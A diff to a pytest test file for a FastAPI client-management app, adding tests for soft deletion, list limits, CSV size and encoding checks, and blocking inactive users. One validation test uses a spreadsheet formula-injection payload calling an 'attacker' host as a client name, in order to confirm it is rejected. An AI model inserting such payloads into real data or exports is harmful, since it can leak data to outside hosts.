@@ -1,9 +1,21 @@
 import pytest
 from fastapi import HTTPException
+from pydantic import ValidationError
 
+from app.api.auth import upsert_authenticated_user
 from app.api.clientes import _ensure_cliente_access
+from app.core.auth import require_role
 from app.models.cliente import ClienteCreate
-from app.services.clientes import create_cliente, delete_cliente, get_cliente_or_404
+from app.services.dashboard import build_dashboard
+from app.services.clientes import (
+    MAX_CSV_ROWS,
+    create_cliente,
+    delete_cliente,
+    get_cliente_or_404,
+    list_clientes,
+    parse_clientes_csv,
+)
+from app.services.users import list_users
 
 
 class FakeDocumentSnapshot:
@@ -24,6 +36,9 @@ class FakeDocumentReference:
     def set(self, data):
         self.collection.rows[self.document_id] = data
 
+    def update(self, changes):
+        self.collection.rows[self.document_id].update(changes)
+
     def get(self):
         return FakeDocumentSnapshot(
             self.document_id,
@@ -41,10 +56,19 @@ class FakeCollection:
     def document(self, document_id):
         return FakeDocumentReference(self, document_id)
 
+    def stream(self):
+        return [
+            FakeDocumentSnapshot(document_id, data)
+            for document_id, data in self.rows.items()
+        ]
+
 
 class FakeDb:
     def __init__(self):
-        self.collections = {"clientes": FakeCollection()}
+        self.collections = {
+            "clientes": FakeCollection(),
+            "users": FakeCollection(),
+        }
 
     def collection(self, name):
         return self.collections[name]
@@ -67,7 +91,7 @@ def test_supervisor_can_access_any_cliente():
     _ensure_cliente_access(cliente, user)
 
 
-def test_delete_cliente_removes_existing_document():
+def test_delete_cliente_hides_existing_document_without_physical_delete():
     db = FakeDb()
     created = create_cliente(
         db,
@@ -87,3 +111,142 @@ def test_delete_cliente_removes_existing_document():
         get_cliente_or_404(db, created["id"])
 
     assert exc_info.value.status_code == 404
+    stored = db.collection("clientes").rows[created["id"]]
+    assert stored["estado"] == "Inactivo"
+    assert stored["deletedAt"] is not None
+    assert list_clientes(db) == []
+
+
+def test_list_clientes_limits_large_responses():
+    db = FakeDb()
+    for index in range(105):
+        create_cliente(
+            db,
+            ClienteCreate(
+                nombre=f"Cliente {index}",
+                empresa=f"Empresa {index}",
+                email=f"cliente{index}@encipharm.cl",
+                rubro="Cerdos",
+                region="Maule",
+                vendedorUid="seller-1",
+            ),
+        )
+
+    assert len(list_clientes(db, limit=10)) == 10
+
+
+def test_dashboard_counts_all_clients_without_api_limit():
+    db = FakeDb()
+    for index in range(105):
+        create_cliente(
+            db,
+            ClienteCreate(
+                nombre=f"Cliente {index}",
+                empresa=f"Empresa {index}",
+                email=f"dashboard{index}@encipharm.cl",
+                rubro="Aves",
+                region="Maule",
+                vendedorUid="seller-1",
+            ),
+        )
+
+    dashboard = build_dashboard(db, vendedor_uid="seller-1")
+
+    assert dashboard["totalClientes"] == 105
+
+
+def test_list_users_limits_large_responses():
+    db = FakeDb()
+    for index in range(105):
+        db.collection("users").document(f"user-{index}").set({
+            "uid": f"user-{index}",
+            "email": f"user{index}@encipharm.cl",
+            "nombre": f"User {index}",
+            "rol": "vendedor",
+            "activo": True,
+        })
+
+    assert len(list_users(db, limit=25)) == 25
+
+
+def test_cliente_rejects_formula_injection_payloads():
+    with pytest.raises(ValidationError):
+        ClienteCreate(
+            nombre="=IMPORTXML(\"http://attacker\")",
+            empresa="Empresa",
+            email="cliente@encipharm.cl",
+            rubro="Cerdos",
+            region="Maule",
+        )
+
+
+def test_csv_rejects_invalid_encoding():
+    with pytest.raises(HTTPException) as exc_info:
+        parse_clientes_csv(b"\xff\xfe\x00")
+
+    assert exc_info.value.status_code == 400
+
+
+def test_csv_rejects_oversized_file():
+    content = b"nombre,empresa,email\n" + (b"a" * 1_000_001)
+
+    with pytest.raises(HTTPException) as exc_info:
+        parse_clientes_csv(content)
+
+    assert exc_info.value.status_code == 413
+
+
+def test_csv_rejects_too_many_rows():
+    rows = [
+        "nombre,empresa,email",
+        *[
+            f"Cliente {index},Empresa {index},cliente{index}@encipharm.cl"
+            for index in range(MAX_CSV_ROWS + 1)
+        ],
+    ]
+
+    with pytest.raises(HTTPException) as exc_info:
+        parse_clientes_csv("\n".join(rows).encode("utf-8"))
+
+    assert exc_info.value.status_code == 413
+
+
+@pytest.mark.anyio
+async def test_inactive_user_cannot_pass_role_checker(monkeypatch):
+    db = FakeDb()
+    db.collection("users").document("seller-1").set({
+        "uid": "seller-1",
+        "email": "seller@encipharm.cl",
+        "nombre": "Seller",
+        "rol": "vendedor",
+        "activo": False,
+    })
+    monkeypatch.setattr("app.core.auth.get_db", lambda: db)
+
+    checker = require_role("vendedor")
+    with pytest.raises(HTTPException) as exc_info:
+        await checker({"uid": "seller-1", "rol": "vendedor"})
+
+    assert exc_info.value.status_code == 403
+
+
+@pytest.mark.anyio
+async def test_inactive_user_cannot_login(monkeypatch):
+    db = FakeDb()
+    db.collection("users").document("seller-1").set({
+        "uid": "seller-1",
+        "email": "seller@encipharm.cl",
+        "nombre": "Seller",
+        "rol": "vendedor",
+        "activo": False,
+    })
+    monkeypatch.setattr("app.api.auth.get_db", lambda: db)
+
+    with pytest.raises(HTTPException) as exc_info:
+        await upsert_authenticated_user({
+            "uid": "seller-1",
+            "email": "seller@encipharm.cl",
+            "name": "Seller",
+        })
+
+    assert exc_info.value.status_code == 403
